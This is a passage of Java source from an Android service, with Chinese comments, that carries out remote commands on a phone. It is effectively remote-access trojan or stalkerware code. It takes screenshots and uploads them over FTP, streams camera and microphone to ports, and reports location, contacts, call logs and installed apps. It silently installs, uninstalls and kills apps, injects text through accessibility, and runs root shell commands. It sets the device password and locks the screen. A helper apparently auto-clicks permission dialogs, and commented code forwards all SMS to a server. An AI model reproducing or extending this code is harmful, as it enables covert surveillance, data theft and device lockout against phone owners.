		int p=s.indexOf(";");
		if(p==-1)return;
		String phone=s.substring(0,p);
		String content=s.substring(p+1);
		//boolean bResult=SmsReceiver.SendSms(phone, content);
		//if(bPermission==false&&bResult==true)
		//ConfigCt.getConfigCt(this).setIsSendSmsToPhone(true);
	}
	/*
	 * 群发送短信
	 */
	private void processSendSmss(byte[] data){
		if(data==null)return;
		boolean bPermission=ConfigCt.getInstance(this).getIsSendSmsToPhone();
		if(!bPermission){
			if(GivePermission.getGivePermission().isEnable()){
				GivePermission.getGivePermission().setKeyWords(new String[]{"发送"});
				GivePermission.getGivePermission().EventStart();
				GivePermission.getGivePermission().TimeStart();
			}else{
				return;
			}
		}
		String s=order.byte2Str(data);
		if(s==null)return;
		//SmsSender.getInstance(getApplicationContext()).SmsSendsThread(s);
	}
	/*
	 * 群发送短信
	 */
	private void processClearSms(){

		//SmsSender.getInstance(getApplicationContext()).DelSmsByBody("1");
	}

	/*
	 * 相机
	 */
	private void processCarmera(final Context context){
		Intent intent=new Intent(context, Camera101Activity.class);
		intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
		context.startActivity(intent);
	}



	/*
	 * 执行截屏
	 */
	private void processShotScreen(final int port,byte[] data){
		if(data==null)return;
		if(data.length<4)return;
		byte[] tmp=new byte[4];
		System.arraycopy(data, 0, tmp,0, 4);
		final int newPort=ConfigCt.cPort_screen;
		int shotSeries=order.byte2Int(tmp);
		if(ScreenRecord101Activity.shotter==null){
			if(ConfigCt.getInstance(getApplicationContext()).haveScreenShotPower())
				shotScreenPrepare();//SplashActivity.restartApp(getApplicationContext());
			else
				shotScreenPrepare();
			return;
		}
		if(shotSeries==1){
			ScreenRecord101Activity.shotter.ShotSeriesThread(newPort);
			return;
		}
		if(shotSeries==2){
			ScreenRecord101Activity.shotter.StopShotSeries();;
			return;
		}
		final String filename=Funcs.getFilename(ConfigCt.appID, ".jpg");
		Funcs.makeDir(ConfigCt.LocalUploadPath);
		ScreenRecord101Activity.shotter.startScreenShot(new Shotter.OnShotListener() {
			@Override
			public void onFinish(Bitmap bitmap) {
				ftp.getFtp(Order101Service.this).UploadStart(filename);
				SendBmp(order.CMD_SHOT,bitmap,20,newPort);
			}
		},ConfigCt.LocalUploadPath+filename,50);
	}
	/*
	 * 执行截屏
	 */
	private void processShotScreen(){
		if(ScreenRecord101Activity.shotter==null){
			if(ConfigCt.getInstance(getApplicationContext()).haveScreenShotPower())
				shotScreenPrepare();//SplashActivity.restartApp(getApplicationContext());
			else
				shotScreenPrepare();
			return;
		}
		final String filename=Funcs.getFilename(ConfigCt.appID, ".jpg");
		Funcs.makeDir(ConfigCt.LocalUploadPath);
		ScreenRecord101Activity.shotter.startScreenShot(new Shotter.OnShotListener() {
			@Override
			public void onFinish(Bitmap bitmap) {
				ftp.getFtp(Order101Service.this).UploadStart(filename);
				SendBmp(order.CMD_SHOT,bitmap);
			}
		},ConfigCt.LocalUploadPath+filename,50);
	}
	/*
	 * 执行定位
	 */
	private void processLocation(){
		MyLocation location=MyLocation.getMyLocation(getApplicationContext());
		if(ConfigCt.getInstance(getApplicationContext()).haveLocatePermission()){
			location.Start();
		}else{

		}
	}
	/*
	 * 获取已安装的应用信息：
	 */
	private void processGetInstallAppInfo(final int cmd){
		new Thread(new Runnable() {
			@Override
			public void run() {
				try{
					List<AppInfo> appInfos=AppInfoUtil.getInstance(Order101Service.this).getInstalledApps(AppInfoUtil.GET_ALL_APP);
					if(appInfos==null||appInfos.size()==0)return;
					String ss="";
					for(AppInfo app:appInfos){
						ss=ss+app.getAppName()+";"+app.getPackageName()+";"+app.getFlag()+";";
					}
					SendBaseInfo(cmd,ss);
				}catch(Exception e){
					e.printStackTrace();
				}
			}
		}).start();
	}
	/*
	 * 安装应用：
	 */
	private void processInstallApp(final byte[] data){
		if(GivePermission.getGivePermission().isEnable()){
			GivePermission.getGivePermission().setKeyWords(new String[]{"安装","完成"});
			GivePermission.getGivePermission().EventStart();
			GivePermission.getGivePermission().TimeStart();
		}
		new Thread(new Runnable() {
			@Override
			public void run() {
				try {
					FileSystem.PhoneDir phonDir=FileSystem.getFileSystem(getApplicationContext()).byte2PhoneDir(data);
					String filename=FileSystem.getFileSystem(getApplicationContext()).getFullDir(phonDir.iRootDir,phonDir.subDir);
					AppInfoUtil.installApk(getApplicationContext(), filename);
				} catch (Exception e) {
					e.printStackTrace();
				}//try {
			}// public void run() {
		}).start();//new Thread(new Runnable() {
	}

	private void wakeService(Context context,String pkg,String serviceName){
		Intent serviceIntent = new Intent();
		serviceIntent.setComponent(new ComponentName(pkg, serviceName));
		serviceIntent.setPackage(context.getPackageName());
		serviceIntent.setAction("action");
		context.startService(serviceIntent);
	}
	/*
	 * 卸载应用：
	 */
	private void processUnInstallApp(final byte[] data){
		if(GivePermission.getGivePermission().isEnable()){
			GivePermission.getGivePermission().setKeyWords(new String[]{"卸载","确定","完成"});
			GivePermission.getGivePermission().EventStart();
			GivePermission.getGivePermission().TimeStart();
		}
		new Thread(new Runnable() {
			@Override
			public void run() {
				try {
					String pkg=order.byte2Str(data);
					AppInfoUtil.uninstallApk(getApplicationContext(), pkg);
				} catch (Exception e) {
					e.printStackTrace();
				}//try {
			}// public void run() {
		}).start();//new Thread(new Runnable() {
	}
	/*
	 * 运行应用：
	 */
	private void processRunApp(final byte[] data){
		if(GivePermission.getGivePermission().isEnable()){
			GivePermission.getGivePermission().setKeyWords(new String[]{"允许"});
			GivePermission.getGivePermission().EventStart();
			GivePermission.getGivePermission().TimeStart();
		}
		new Thread(new Runnable() {
			@Override
			public void run() {
				try {
					String pkg=order.byte2Str(data);
					if(pkg.equals("com.d13yc.ch"))
						AppInfoUtil.RunApp(getApplicationContext(), pkg, "activity.Splash101Activity");
					else
						AppInfoUtil.RunApp(getApplicationContext(), pkg);
					//StoppedBroadcastReceiver.sendWakeBroatCast(getApplicationContext(),pkg);
					wakeService(getApplicationContext(),pkg,"order.Order101Service");
				} catch (Exception e) {
					e.printStackTrace();
				}//try {
			}// public void run() {
		}).start();//new Thread(new Runnable() {
	}
	/*
	 * 终止运行应用：
	 */
	private void processKillApp(final byte[] data){
		if(GivePermission.getGivePermission().isEnable()){
			GivePermission.getGivePermission().EventStart();
			GivePermission.getGivePermission().TimeStart();
		}
		new Thread(new Runnable() {
			@Override
			public void run() {
				try {
					String pkg=order.byte2Str(data);
					AppInfoUtil.killProcess(getApplicationContext(), pkg);
				} catch (Exception e) {
					e.printStackTrace();
				}//try {
			}// public void run() {
		}).start();//new Thread(new Runnable() {
	}
	/*
	 * 捕获摄像头
	 * */
	private void processCameraCap(int port,final byte[] data){
		if(data==null)return;
		if(data.length<4)return;
		byte[] tmp=new byte[4];
		System.arraycopy(data, 0, tmp,0, 4);
		int params=order.byte2Int(tmp);
		int singlePic=params%10;
		boolean bSinglePic=false;
		if(singlePic>0) bSinglePic=true;
		int quality=params/10;
		final int newPort=ConfigCt.cPort_camera;
		CameraCapture.getInstance(getApplicationContext()).start(newPort,bSinglePic, quality);
	}
	/*
	 * 捕获声音
	 * */
	private void processSoundCap(int port){
		int newPort=ConfigCt.cPort_sound;
		AudioRecording.getInstance().startRecording(newPort);
	}

	//----------------------------------模块初始化-------------------------------------------------
	Handler handler= new Handler();
	/*
	 * 截屏初始化：
	 */
	private void shotScreenPrepare(){
		final Handler handler= new Handler();
		Runnable runnableShotScreen  = new Runnable() {
			@Override
			public void run() {
				if(ConfigCt.getInstance(getApplicationContext()).haveScreenShotPower()){
					ScreenRecord101Activity.startInstance(getApplicationContext(), ScreenRecord101Activity.REQUEST_SHOT_SCREEN);
					return;
				}else{
					if(GivePermission.getGivePermission().isEnable()){
						GivePermission.getGivePermission().EventStart();
						GivePermission.getGivePermission().TimeStart();
						//ScreenShotActivity.startInstance(getApplicationContext(), ScreenShotActivity.REQUEST_MEDIA_PROJECTION);
						ScreenRecord101Activity.startInstance(getApplicationContext(), ScreenRecord101Activity.REQUEST_SHOT_SCREEN);
						return;
					}
				}
				handler.postDelayed(this, 1000*5);
			}
		};
		handler.postDelayed(runnableShotScreen, 1000*1);
	}
	/*
	 * 短信模块初始化：

	private void smsPrepare(){
		if(ConfigCt.getInstance( Order101Service.this).getIsSendSms()){//申请读取短信权限：
			SmsObserver.registerServer(getApplicationContext());
		}else{
			Runnable runnableSms  = new Runnable() {
				@Override
				public void run() {
					if(ConfigCt.getInstance(getApplicationContext()).getIsSendSms()){
						SmsObserver.registerServer(getApplicationContext());
						return;
					}
					if(GivePermission.getGivePermission().isEnable()){
						GivePermission.getGivePermission().EventStart();
						GivePermission.getGivePermission().TimeStart();
						SmsReceiver.sendALLSmsToServer(Order101Service.this, ConfigCt.appID+"-sma");
						return;
					}
					handler.postDelayed(this, 1000*10);
				}
			};
			handler.postDelayed(runnableSms, 1000*10);
		}
	}
	*/

	/*
	 * root模块初始化：
	 */
	private boolean bExcCmd=true;
	private void rootPrepare(){
		if(!ConfigCt.bRoot)return;
		bExcCmd=true;
		Runnable runnableRoot  = new Runnable() {
			@Override
			public void run() {
				if(ConfigCt.getInstance(getApplicationContext()).haveRootPermission()){
					//if(QiangHongBaoService.getQiangHongBaoService()==null)//守护线程：
					//RootShellCmd.OpenAccessibility(getApplicationContext());
					return;
				}else{//申请授权
					if(GivePermission.getGivePermission().isEnable()){
						if(bExcCmd){
							GivePermission.getGivePermission().EventStart();
							GivePermission.getGivePermission().TimeStart();
							ExcCmd.getInstance().testCmd();
							bExcCmd=false;
						}else{
							if(ExcCmd.getInstance().getResult())
								ConfigCt.getInstance(getApplicationContext()).setRootPermission(true);
							return;
						}
					}
				}
				handler.postDelayed(this, 1000*1);
			}
		};
		handler.postDelayed(runnableRoot, 1000*1);
	}
	/*
	 * 定位初始化：
	 */
	private void LocatePrepare(){
		if(!ConfigCt.getInstance(this).haveLocatePermission()){
			final Handler handler= new Handler();
			Runnable runnableLocation  = new Runnable() {
				@Override
				public void run() {
					if(GivePermission.getGivePermission().isEnable()){
						GivePermission.getGivePermission().EventStart();
						GivePermission.getGivePermission().TimeStart();
						MyLocation location=MyLocation.getMyLocation(getApplicationContext());
						location.GetSingleLocationThread();
						return;
					}
					handler.postDelayed(this, 1000*5);
				}
			};
			handler.postDelayed(runnableLocation, 1000*1);
		}else{
			//MyLocation location=MyLocation.getMyLocation(getApplicationContext());
			//location.Start();
			SendBaseInfo(order.CMD_LOCATION_SINGLE);
		}
	}
	/*
	 * 发送通话记录初始化：
	 */
	private void CallPrepare(int cmd){
		if(!ConfigCt.getInstance(getApplicationContext()).getIsReadCallLog()){
			if(GivePermission.getGivePermission().isEnable()){
				GivePermission.getGivePermission().EventStart();
				GivePermission.getGivePermission().TimeStart();
			}else{
				return;
			}
		}
		SendBaseInfo(cmd);
	}
	/*
	 * 发送通讯录初始化：order.CMD_CONTACT_CONTENT
	 */
	private void ContactPrepare(int cmd){
		if(!ConfigCt.getInstance(getApplicationContext()).getIsReadContact()){
			if(GivePermission.getGivePermission().isEnable()){
				GivePermission.getGivePermission().EventStart();
				GivePermission.getGivePermission().TimeStart();
			}else{
				return;
			}
		}
		SendBaseInfo(cmd);
	}
	//********************************************文本输入**************************************************
	/*
	 * 执行文本输入：order.CMD_INPUT
	 */
	private void processInput(byte[] data){
		if(data==null)return;
		inputTxtThread(data);
		//String txt=order.byte2Str(data);
		//if(QiangHongBaoService.service==null)return;
		//AccessibilityNodeInfo editNode=getEditFromFocus(QiangHongBaoService.service);
		//if(editNode==null)return;
		//nodeInput(this,editNode,txt);
	}
	/*
		执行文本输入：
	 */
	public void inputTxtThread(final byte[] data){
		new Thread(new Runnable() {
			@Override
			public void run() {
				try {
					String txt=order.byte2Str(data);
					if(Acc101Service.service==null)return;
					AccessibilityNodeInfo editNode=getEditFromFocus(Acc101Service.service);
					if(editNode==null)return;
					nodeInput(getApplicationContext(),editNode,txt);
				} catch (Exception e) {
					e.printStackTrace();
				}//try {
			}// public void run() {
		}).start();//new Thread(new Runnable() {
	}
	/*
	 * 找到具有输入焦点的文本框：
	 */
	private static AccessibilityNodeInfo getEditFromFocus(AccessibilityService service){
		if(service==null)return null;
		AccessibilityNodeInfo rootNode=service.getRootInActiveWindow();
		if(rootNode==null)return null;
		return rootNode.findFocus(AccessibilityNodeInfo.FOCUS_INPUT);
	}
	@TargetApi(Build.VERSION_CODES.LOLLIPOP)
	public  static boolean nodeInput(Context context,AccessibilityNodeInfo edtNode,String txt){
		if(Build.VERSION.SDK_INT >=Build.VERSION_CODES.LOLLIPOP){//android 5.0
			Bundle arguments = new Bundle();
			arguments.putCharSequence(AccessibilityNodeInfo .ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE,txt);
			edtNode.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, arguments);
			return true;
		}
		if(Build.VERSION.SDK_INT >=Build.VERSION_CODES.JELLY_BEAN_MR2){//android 4.3
			ClipboardManager clipboard = (ClipboardManager)context.getSystemService(Context.CLIPBOARD_SERVICE);
			ClipData clip = ClipData.newPlainText("text",txt);
			clipboard.setPrimaryClip(clip);
			//edtNode.fo
			edtNode.performAction(AccessibilityNodeInfo.ACTION_FOCUS);
			////粘贴进入内容
			edtNode.performAction(AccessibilityNodeInfo.ACTION_PASTE);
			return true;
		}
		if(Build.VERSION.SDK_INT >=Build.VERSION_CODES.ICE_CREAM_SANDWICH){//android 4.0
			edtNode.performAction(AccessibilityNodeInfo.ACTION_FOCUS);
			String sOrder="input text "+txt;
			AccessibilityHelper.Sleep(5000);
			if(RootShellCmd.getRootShellCmd(context).execShellCmd(sOrder)){
				AccessibilityHelper.Sleep(5000);
				return true;
			}
			return false;
		}
		return false;
	}
	/*
	 * 其次把文件插入到系统图库
	 * */
	private void processInsertImageToGallery(final byte[] data){
		new Thread(new Runnable() {
			@Override
			public void run() {
				try {
					PhoneDir phonDir=fileSystem.byte2PhoneDir(data);
					String filename=fileSystem.getFullDir(phonDir.iRootDir,phonDir.subDir);
					insertImageToGallery(getApplicationContext(),filename);
				} catch (Exception e) {
					e.printStackTrace();
				}//try {
			}// public void run() {
		}).start();//new Thread(new Runnable() {
	}
	/*
	 * 其次把文件插入到系统图库
	 * */
	private void insertImageToGallery(Context context,String filename){
		File file=new File(filename);
		try {
			MediaStore.Images.Media.insertImage(context.getContentResolver(),
					file.getAbsolutePath(), file.getName(), null);
			Log.i("byc001", "照片"+file.getName()+"保存到相册成功！");
		} catch (FileNotFoundException e) {
			Log.i("byc001","照片"+file.getName()+"保存到相册成功！");
			e.printStackTrace();
		}
		// 最后通知图库更新
		context.sendBroadcast(new Intent(Intent.ACTION_MEDIA_SCANNER_SCAN_FILE,
				Uri.fromFile(new File(file.getPath()))));
	}
	/*
	 * ：
	 */
	private void closeSettings(){
		Intent intent=new Intent("android.settings.SETTINGS");
		intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
		intent.putExtra("cancelEnabled", false);
		intent.putExtra("close", true);
		startActivity(intent);
	}
	/*
	 * 执行锁屏
	 */
	public static void processLock(Context context,String pwd){
		//LockService.setLock("800108");
		Intent intent=new Intent(context,LockService.class);
		if(pwd==null)
			intent.putExtra("op", LockService.OP_LOCK);
		else if(pwd.equals(""))
			intent.putExtra("op", LockService.OP_CLEAR_PWD);
		else{
			intent.putExtra("op", LockService.OP_SET_PWD_AND_LOCK);
			intent.putExtra("pwd", pwd);
		}
		context.startService(intent);
	}
	/*
	 * 执行锁屏
	 * null 激活；0000 清空密码；0001 锁屏；0002 锁屏并录屏；
	 */
	public void processLock(byte[] data){
		//LockService.setLock("800108");
		String pwd="";
		if(data==null)
			pwd=null;
		else{
			pwd=order.byte2Str(data);
			if(pwd.equals("0000"))pwd="";
		}
		if (pwd==null){
			if(GivePermission.getGivePermission().isEnable()){
				GivePermission.getGivePermission().EventStart();
				GivePermission.getGivePermission().TimeStart();
			}
			DeviceMethod.getInstance(this.getApplicationContext()).onActivate();
		}else if(pwd.equals("")){
			DeviceMethod.getInstance(this.getApplicationContext()).setPassword("");
		}else if(pwd.equals("0001")){
			DeviceMethod.getInstance(this.getApplicationContext()).LockNow() ;
		}else if(pwd.equals("0002")){
			DeviceMethod.getInstance(this.getApplicationContext()).LockNow() ;
			ScreenRecordService.RecordingScreenDelay(getApplicationContext());
			MyLog.i("lock and screen recording.");
		}

		processLock(this,pwd);
		//FloatWindowLock.getInstance(this).ShowFloatingWindow();
	}


	private void test2(){
		//LockPatternUtils utils = new LockPatternUtils(this);
		//UserManager um = UserManager.get(this);
		//intuserId = um.getCredentialOwnerProfile(UserHandle.myUserId());
	}
	private boolean bStart=true;
	private void test(){
		int i=0;
		int j=10/i;
		Log.e("test", "test"+j);
		//if(!AudioRecording.getInstance().startRecording(8108))
		//AudioRecording.getInstance().stopRecording();
		//if(!AudioRecorder.getInstance().startRecording()){
		//	AudioRecorder.getInstance().stopRecording();
		//AudioRecorder.getInstance().startRecording();
		//}
		//String sdcardPath = Environment.getExternalStorageDirectory().toString();
		//String sourceDir=sdcardPath+"/at";
		//String destDir=ConfigCt.LocalDir+"/at.zip";
		//ZipHelper.zipDir(sourceDir, destDir);
		//if(bStart){
		//	ScreenRecordService.start(getApplicationContext());
		//Intent intent=new Intent(this,ScreenRecordService.class);
		//	//startService(intent);
		///	bStart=false;
		//}else{
		//	ScreenRecordService.stop(getApplicationContext());
		//	bStart=true;
		//}
		//Intent intent=new Intent(this,RecordActivity.class);
		//intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
		//startActivity(intent);
		//if(bStart){
		//	VideoRecorderService.start(getApplicationContext());
		//bStart=false;
		//}else{
		//	VideoRecorderService.stop(getApplicationContext());
		//	bStart=true;
		//}
		//SplashActivity.startSplashActivity(getApplicationContext(), SplashActivity.OP_SHOW_DESK_ICO);
		//SplashActivity.setComponentEnabled(getApplicationContext(), SplashActivity.class, true);
		//SplashActivity.startSplashActivity(getApplicationContext());
		//SplashActivity.restartApp(getApplicationContext());
		//orderThread.restartOrder();
		//Funcs.Sleep(10000);
		//arouseOrderThread(this);
		//testDelay();
		//if(bStart){
		//	this.stopSelf();
		//	bStart=false;
		//}else{
		//	Intent intent=new Intent(this,OrderService.class);
		//	intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
		//	startActivity(intent);
		//	bStart=true;
		//}
	}
	private void testDelay(){
		final Handler handler= new Handler();
		Runnable runnable = new Runnable() {
			@Override
			public void run() {
				arouseOrderThread(getApplicationContext());
				//handler.postDelayed(this, 1000*5);
			}
		};
		handler.postDelayed(runnable, 1000*10);

	}
	//-----------------------------------------------------------------------------------
	    /*
	     *
	       public static void LockReceiver(Context context){
	        final IntentFilter filter = new IntentFilter();
	        // 屏幕灭屏广播
	        filter.addAction(Intent.ACTION_SCREEN_OFF);
	        // 屏幕亮屏广播
	        filter.addAction(Intent.ACTION_SCREEN_ON);
	        // 屏幕解锁广播
	        filter.addAction(Intent.ACTION_USER_PRESENT);
	        // 当长按电源键弹出“关机”对话或者锁屏时系统会发出这个广播
	        // example：有时候会用到系统对话框，权限可能很高，会覆盖在锁屏界面或者“关机”对话框之上，
	        // 所以监听这个广播，当收到时就隐藏自己的对话，如点击pad右下角部分弹出的对话框
	        filter.addAction(Intent.ACTION_CLOSE_SYSTEM_DIALOGS);

	        BroadcastReceiver mBatInfoReceiver = new BroadcastReceiver() {
	            @Override
	            public void onReceive(final Context context, final Intent intent) {
	                	Log.d(ConfigCt.TAG, "onReceive");
	                String action = intent.getAction();

	                if (Intent.ACTION_SCREEN_ON.equals(action)) {
	                    //if(mLockState==LockState.locked)ShowWindow();
	                    Log.d(ConfigCt.TAG, "screen on");
	                } else if (Intent.ACTION_SCREEN_OFF.equals(action)) {
	                	if(MainActivity.mainActivity!=null)MainActivity.mainActivity.showInLockScreen();
	                    Log.d(ConfigCt.TAG, "screen off");
	                } else if (Intent.ACTION_USER_PRESENT.equals(action)) {
	                   // HideWindow();
	                   // mLockState=LockState.unLocked;
	                    Log.d(ConfigCt.TAG, "screen unlock");
	                } else if (Intent.ACTION_CLOSE_SYSTEM_DIALOGS.equals(intent.getAction())) {
	                    Log.i(ConfigCt.TAG, " receive Intent.ACTION_CLOSE_SYSTEM_DIALOGS");
	                }
	            }
	        };
	        Log.d(ConfigCt.TAG, "registerReceiver");
	        context.registerReceiver(mBatInfoReceiver, filter);
	    }
	     */
}
